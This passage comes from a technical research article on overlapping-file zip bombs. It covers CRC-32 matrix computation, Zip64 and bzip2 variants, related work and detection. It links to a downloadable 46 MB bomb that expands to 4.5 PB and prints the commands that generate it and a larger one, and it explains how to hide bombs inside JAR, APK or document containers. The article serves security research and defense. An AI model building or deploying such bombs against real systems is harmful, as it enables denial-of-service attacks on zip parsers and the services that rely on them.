<tr><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td></tr>
<tr><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td></tr>
<tr><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td></tr>
</tbody>
</table><!--

--><table>
<caption><var>M</var><sub>1</sub></caption>
<tbody>
<tr><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td></tr>
<tr><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td></tr>
<tr><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td></tr>
<tr><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td></tr>
<tr><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td></tr>
<tr><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td></tr>
<tr><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td></tr>
<tr><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td></tr>
<tr><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td></tr>
<tr><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td></tr>
<tr><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td></tr>
<tr><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td></tr>
<tr><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td></tr>
<tr><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td></tr>
<tr><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td></tr>
<tr><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td></tr>
<tr><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td></tr>
<tr><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td></tr>
<tr><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td></tr>
<tr><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td></tr>
<tr><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td></tr>
<tr><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td></tr>
<tr><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td></tr>
<tr><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td></tr>
<tr><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td></tr>
<tr><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td></tr>
<tr><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td></tr>
<tr><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>1</td></tr>
<tr><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td></tr>
<tr><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>1</td></tr>
<tr><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>1</td></tr>
<tr><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td></tr>
<tr><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td></tr>
</tbody>
</table>
<figcaption>
The 33×33 transformation matrices <var>M</var><sub>0</sub> and <var>M</var><sub>1</sub> that compute
the CRC-32 state change effected by a 0&nbsp;bit and a 1&nbsp;bit respectively.
Column vectors are stored with the most significant bit at the bottom:
reading the first column from bottom to top, you see
the CRC-32 polynomial constant edb88320<sub>16</sub> =
<span>1</span><span>1</span><span>1</span><span>0</span><span>1</span><span>1</span><span>0</span><span>1</span><span>1</span><span>0</span><span>1</span><span>1</span><span>1</span><span>0</span><span>0</span><span>0</span><span>1</span><span>0</span><span>0</span><span>0</span><span>0</span><span>0</span><span>1</span><span>1</span><span>0</span><span>0</span><span>1</span><span>0</span><span>0</span><span>0</span><span>0</span><span>0</span><sub>2</sub>.
The two matrices differ only in the final column, which represents a translation vector
in homogeneous coordinates.
In <var>M</var><sub>0</sub> the translation is zero and
in <var>M</var><sub>1</sub> it is edb88320<sub>16</sub>, the CRC-32 polynomial constant.
The 1's just above the diagonal represent the
shift operation <code>state&nbsp;&gt;&gt;&nbsp;1</code>.
</figcaption>
</figure>

<p>
Both operations <code>crc32_update_0</code> and <code>crc32_update_1</code>
can be represented by a 33×33 transformation matrix.
The matrices <var>M</var><sub>0</sub> and <var>M</var><sub>1</sub> are shown.
The benefit of a matrix representation is that matrices compose.
Suppose we want to represent the state change effected by processing
the ASCII character 'a', whose binary representation is
01100001<sub>2</sub>.
We can represent the cumulative CRC-32 state change of those 8&nbsp;bits
in a single transformation matrix:
</p>
<figure>
<table>
<tbody><tr>
<td><var>M</var><sub>a</sub></td><td>&nbsp;= <var>M</var><sub>0</sub> <var>M</var><sub>1</sub>&nbsp;<var>M</var><sub>1</sub>&nbsp;<var>M</var><sub>0</sub>&nbsp;<var>M</var><sub>0</sub>&nbsp;<var>M</var><sub>0</sub>&nbsp;<var>M</var><sub>0</sub>&nbsp;<var>M</var><sub>1</sub></td>
</tr>
</tbody></table>
</figure>
<p>
And we can represent the state change of a string of repeated 'a's
by multiplying many copies of <var>M</var><sub>a</sub> together—matrix exponentiation.
We can do matrix exponentiation quickly
using a <a href="https://en.wikipedia.org/wiki/Exponentiation_by_squaring">square-and-multiply</a> algorithm,
which allows us to compute <var>M</var><sup><var>n</var></sup>
in only about log<sub>2</sub> <var>n</var> steps.
For example, the matrix representing the state change
of a string of 9&nbsp;'a's is
</p>
<figure>
<table>
<tbody><tr>
<td>(<var>M</var><sub><code>a</code></sub>)<sup>9</sup></td><td>&nbsp;= <var>M</var><sub><code>a</code></sub>&nbsp;<var>M</var><sub><code>a</code></sub>&nbsp;<var>M</var><sub><code>a</code></sub>&nbsp;<var>M</var><sub><code>a</code></sub>&nbsp;<var>M</var><sub><code>a</code></sub>&nbsp;<var>M</var><sub><code>a</code></sub>&nbsp;<var>M</var><sub><code>a</code></sub>&nbsp;<var>M</var><sub><code>a</code></sub>&nbsp;<var>M</var><sub><code>a</code></sub></td>
</tr>
<tr>
<td></td><td>&nbsp;= (<var>M</var><sub><code>a</code></sub>&nbsp;<var>M</var><sub><code>a</code></sub>&nbsp;<var>M</var><sub><code>a</code></sub>&nbsp;<var>M</var><sub><code>a</code></sub>)<sup>2</sup>&nbsp;<var>M</var><sub><code>a</code></sub></td>
</tr>
<tr>
<td></td><td>&nbsp;= ((<var>M</var><sub><code>a</code></sub>&nbsp;<var>M</var><sub><code>a</code></sub>)<sup>2</sup>)<sup>2</sup>&nbsp;<var>M</var><sub><code>a</code></sub></td>
</tr>
<tr>
<td></td><td>&nbsp;= (((<var>M</var><sub><code>a</code></sub>)<sup>2</sup>)<sup>2</sup>)<sup>2</sup>&nbsp;<var>M</var><sub><code>a</code></sub></td>
</tr>
</tbody></table>
</figure>

<p>
The square-and-multiply algorithm is useful
for computing <var>M</var><sub>kernel</sub>,
the matrix for the uncompressed kernel,
because the kernel is a string of repeated bytes.
To produce a CRC-32 checksum value from a matrix,
multiply the matrix by the zero vector.
(The zero vector in homogeneous coordinates, that is:
32&nbsp;0's followed by a&nbsp;1.
Here we omit the minor complication of pre- and post-conditioning the checksum.)
To compute the checksum for every file, we work backwards.
Start by initializing <var>M</var>&nbsp;:=&nbsp;<var>M</var><sub>kernel</sub>.
The checksum of the kernel is also the checksum
of the final file, file&nbsp;<var>N</var>,
so multiply <var>M</var> by the zero vector and store the resulting checksum in
CDH<sub><var>N</var></sub> and LFH<sub><var>N</var></sub>.
The file data of file&nbsp;<var>N</var>&nbsp;−&nbsp;1 is the same as the file data of file&nbsp;<var>N</var>,
but with an added prefix of LFH<sub><var>N</var></sub>.
So compute <var>M</var><sub>LFH<sub><var>N</var></sub></sub>,
the state change matrix for LFH<sub><var>N</var></sub>,
and update <var>M</var>&nbsp;:=&nbsp;<var>M</var>&nbsp;<var>M</var><sub>LFH<sub><var>N</var></sub></sub>.
Now <var>M</var> represents the cumulative state change from processing
LFH<sub><var>N</var></sub> followed by the kernel.
Compute the checksum for file <var>N</var>&nbsp;−&nbsp;1 by again multiplying <var>M</var> by the zero vector.
Continue the procedure, accumulating state change matrices into <var>M</var>,
until all the files have been processed.
</p>

<!--
<p>
The <a href=#source>source code</a> employs an additional
optimization on top of the conceptual scheme outlined in the previous paragraph.
Instead of updating
<var>M</var> := <var>M</var> <var>M</var><sub>LFH<sub><var>i</var></sub></sub>
after each file, we update
<var>M</var> := <var>M</var> (<var>M</var><sub>0</sub>)<sup>|LFH<sub><var>i</var></sub>|</sup>,
where |LFH<sub><var>i</var></sub>|
is the size of LFH<sub><var>i</var></sub> in bytes.
</p>
-->

</section>

<section id="zip64">
<h2>Extension: Zip64</h2>

<p>
<a href="#allocation">Earlier</a> we hit a wall on expansion
due to limits of the zip format—it was impossible
to produce more than about 281&nbsp;TB of output,
no matter how cleverly packed the zip file.
It is possible to surpass those limits
using <a href="https://en.wikipedia.org/wiki/Zip_(file_format)#ZIP64">Zip64</a>,
an extension to the zip format that increases
the size of certain header fields to 64&nbsp;bits.
Support for Zip64 is <a href="#compatibility">by no means universal</a>,
but it is one of the more commonly implemented extensions.
As regards the compression ratio,
the effect of Zip64 is to
increase the size of a central directory header from
46&nbsp;bytes to 58&nbsp;bytes,
and the size of a local directory header from
30&nbsp;bytes to 50&nbsp;bytes.
Referring to
<a href="#eq-S_X_N_OPT">the formula</a>
for optimal expansion in the simplified model,
we see that a zip bomb in Zip64 format
still grows quadratically,
but more slowly because of the larger denominator—this
is visible in
<a href="#zipped_size">the figure below</a>
in the Zip64 line's
slightly lower vertical placement.
In exchange for the loss of compatibility
and slower growth,
we get the removal of all practical file size limits.
</p>

<p>
Suppose we want a zip bomb that expands to
<data value="4507981343026016">4.5&nbsp;<abbr title="petabyte">PB</abbr></data>,
the same size that 42.zip recursively expands to.
How big must the zip file be?
Using binary search, we find that the smallest
zip file whose unzipped size exceeds the unzipped size of 42.zip
has a zipped size of
<data value="45876952">46&nbsp;<abbr title="megabyte">MB</abbr></data>.
</p>

<div id="download-zbxl">
<p><a href="https://www.bamsoftware.com/hacks/zipbomb/zbxl.zip" download=""><img src="https://www.bamsoftware.com/hacks/zipbomb/zip.png" alt=""> zbxl.zip</a>
<span><data value="45876952">46&nbsp;<abbr title="megabyte">MB</abbr></data>&nbsp;→&nbsp;<data value="4507981427706459">4.5&nbsp;<abbr title="petabyte">PB</abbr></data> (Zip64, less compatible)</span></p><pre>zipbomb --mode=quoted_overlap --num-files=190023 --compressed-size=22982788 --zip64 &gt; zbxl.zip</pre>
</div>

<p>
4.5&nbsp;<abbr title="petabyte">PB</abbr> is roughly
the size of the data captured by the Event Horizon Telescope
to make the
<a href="https://www.vice.com/en/article/597m7q/reddits-data-hoarders-are-freaking-out-over-all-that-black-hole-data">first image of a black hole</a>,
stacks and stacks of hard drives.
</p>

<p>
With Zip64, it's no longer practically interesting to
consider the maximum compression ratio,
because we can just keep increasing the zip file size,
and the compression ratio along with it,
until even the compressed zip file is prohibitively large.
An interesting threshold, though,
is
<data value="18446744073709551616">2<sup>64</sup>&nbsp;bytes</data>
(<data value="18446744073709551616">18&nbsp;<abbr title="exabyte">EB</abbr></data> or
<data value="18446744073709551616">16&nbsp;<abbr title="exbibyte">EiB</abbr></data>)—that
much data
<a href="https://en.wikipedia.org/wiki/Comparison_of_file_systems#Limits">will not fit on most filesystems</a>.
Binary search finds the smallest zip bomb that produces at least that much output:
it contains <data value="12056313">12&nbsp;million</data> files
and has a compressed kernel of <data value="1482284040">1.5&nbsp;<abbr title="gigabyte">GB</abbr></data>.
The total size of the zip file is
<data value="2961656712">2.9&nbsp;<abbr title="gigabyte">GB</abbr></data>
and it unzips to
<data value="18446744085437447493">2<sup>64</sup>&nbsp;+&nbsp;11 727 895 877 bytes</data>,
having a compression ratio of over <data value="6228522033.190134">6.2&nbsp;billion</data>.
I&nbsp;didn't make this one downloadable,
but you can generate it yourself using the <a href="#source">source code</a>.
It contains files so large that it uncovers
<a href="https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=929502">a bug</a>
in Info-ZIP UnZip&nbsp;6.0.
</p>

<pre>zipbomb --mode=quoted_overlap --num-files=12056313 --compressed-size=1482284040 --zip64 &gt; zbxxl.zip
</pre>

<!--
# time python3 zipbomb - -mode=quoted_overlap - -num-files=12056313 - -compressed-size=1482284040 - -zip64 > zbxxl.zip

real    52m3.082s
user    51m50.728s
sys     0m11.940s
-->

</section>

<section id="bzip2">
<h2>Extension: bzip2</h2>



<p>
DEFLATE is the most common compression algorithm
used in the zip format, but it is only one of many options.
Probably the second most common algorithm is <a href="https://en.wikipedia.org/wiki/Bzip2">bzip2</a>,
while not as compatible as DEFLATE,
is probably the second most commonly supported compression algorithm.
Empirically, bzip2 has a maximum compression ratio of about 1.4&nbsp;million,
which allows for denser packing of the kernel.
Ignoring the loss of compatibility,
does bzip2 enable a more efficient zip bomb?
</p>

<p>
Yes—but only for small files.
The problem is that bzip2 does not have anything like the
<a href="#quote">non-compressed blocks</a> of DEFLATE
that we used to <a href="#quote">quote local file headers</a>.
So it is not possible to overlap files and reuse the kernel—each file must have
its own copy, and therefore the overall compression ratio
is no better than the ratio of any single file.
In <a href="#zipped_size">the figure</a> we see that
no-overlap bzip2 outperforms quoted DEFLATE
only for files under about a megabyte.
</p>

<p>
There is still hope for using bzip2—an
alternative means of local file header quoting
discussed in <a href="#extra">the next section</a>.
Additionally,
if you happen to know that a certain zip parser supports bzip2
<em>and</em> tolerates mismatched filenames,
then you can use the <a href="#overlap">full-overlap construction</a>,
which has no need for quoting.
</p>

<figure id="zipped_size">
<picture>
<source srcset="https://www.bamsoftware.com/hacks/zipbomb/zipped_size.svg" type="image/svg+xml">
<img src="https://www.bamsoftware.com/hacks/zipbomb/zipped_size.png" alt="Log–log plot of unzipped size versus zipped size for different zip file constructions: DEFLATE, bzip2, quoted DEFLATE, and 42.zip (recursive and non-recursive).">
</picture>
<figcaption>
Zipped size versus unzipped size for various zip bomb constructions.
Note the log–log scales.
Each construction is shown with and without Zip64.
The no-overlap constructions
have a linear rate of growth,
which is visible in the 1:1 slope of the lines.
The vertical offset of the bzip2 lines shows that the compression ratio
of bzip2 is about a thousand times greater than that of DEFLATE.
The quoted-DEFLATE constructions
have a quadratic rate of growth,
as evidenced by the 2:1 slope of the lines.
The Zip64 variant is slightly less efficient,
but permits output in excess of 281&nbsp;TB.
The lines for extra-field-quoted bzip2
transition from quadratic to linear
upon reaching either the maximum file size
(<data value="65534">2<sup>32</sup>&nbsp;−&nbsp;2 bytes</data>),
or the maximum number of files allowed by extra-field quoting.
</figcaption>
</figure>

</section>



<section id="discussion">
<h2>Discussion</h2>

<p>
In related work,
<a href="http://sar.informatik.hu-berlin.de/research/publications/index.htm#SAR-PR-2006-04">Plötz et&nbsp;al.</a>
used overlapping files to create a
near-self-replicating zip file.
Gynvael Coldwind
has <a href="https://gynvael.coldwind.pl/?id=682">previously suggested</a> (slide&nbsp;47)
overlapping files.
<a href="https://www.usenix.org/conference/usenixsecurity15/technical-sessions/presentation/pellegrino">Pellegrino et&nbsp;al.</a>
found systems vulnerable to compression bombs
and other resource exhaustion attacks
and listed common pitfalls in specification,
implementation, and configuration.
</p>

<p>
We have designed the quoted-overlap zip bomb construction for compatibility,
taking into consideration a number of implementation differences,
some of which are shown in <a href="#compatibility">the table below</a>.
The resulting construction is compatible with zip parsers that work
in the usual back-to-front way,
first consulting the central directory
and using it as an index of files.
Among these is the example
zip parser included in <a href="https://www.usenix.org/conference/osdi14/technical-sessions/presentation/bangert">Nail</a>,
which is automatically generated from a formal grammar.
The construction is not compatible, however,
with "streaming" parsers,
those that parse the zip file from beginning to end in one pass
without first reading the central directory.
By their nature, streaming parsers
do not permit any kind of file overlapping.
The most likely outcome is that they
will extract only the first file.
They may even raise an error besides,
as is the case with <a href="https://github.com/madler/sunzip">sunzip</a>,
which parses the central directory at the end and checks it for consistency
with the local file headers it has already seen.
</p>

<p>
If you need the extracted files to start with a certain prefix
(so that they will be identified as a certain file type, for example),
you can insert a data-carrying DEFLATE block just before the
block that quotes the next header.
Not every file has to participate in the bomb construction:
you can include ordinary files
alongside the bomb files
if you need the zip file to conform to some higher-level format.
(The <a href="#source">source code</a> has a <code>--template</code>
option to facilitate this use case.)
Many file formats use zip as a container;
examples are Java JAR, Android APK, and LibreOffice documents.
</p>

<p id="pdf">
<a href="https://en.wikipedia.org/wiki/PDF">PDF</a>
is in many ways similar to zip.
It has a cross-reference table at the end of the file
that points to objects earlier in the file,
and it supports DEFLATE compression of objects through
the FlateDecode filter.
Didier Stevens
<a href="https://blog.didierstevens.com/2008/05/19/pdf-stream-objects/">writes</a>
about having contained a 1&nbsp;GB stream inside a
<data value="2642">2.6&nbsp;kB</data> PDF file
by stacking FlateDecode filters.
If a PDF parser limits the amount of stacking,
then it is probably possible to use the DEFLATE quoting idea
to overlap PDF objects.
</p>



<p id="mitigation">
Detecting the specific class of zip bomb we have developed in this article is easy:
look for overlapping files.
Mark Adler has written <a href="https://github.com/madler/unzip/commits/6519bf0f8a896851d9708da11e1b63c818238c8f">a patch</a>
for Info-ZIP UnZip that does just that.
<!-- updated:
https://github.com/madler/unzip/commit/6d351831be705cc26d897db44f878a978f4138fc

https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=963996
https://github.com/madler/unzip/commit/5e2efcd633a4a1fb95a129a75508e7d769e767be
https://github.com/madler/unzip/commit/5c572555cf5d80309a07c30cf7a54b2501493720
-->
In general, though, rejecting overlapping files
does not by itself make it safe to handle untrusted zip files.
There are zip bombs that do not rely on overlapping files,
and there are malicious zip files that are not bombs.
Furthermore, any such detection logic must
be implemented inside the parser itself,
not as a separate prefilter.
One of the details
omitted from <a href="#zip">the description of the zip format</a> is that
there is no single well-defined algorithm for locating
the central directory in a zip file:
two parsers may find two different central directories
and therefore
<a href="https://gynvael.coldwind.pl/?id=682">may not even agree on what files a zip file contains</a>
(slides 67–80).
Predicting the total uncompressed size
by summing the sizes of all files
does not work, in general,
because the sizes stored in metadata
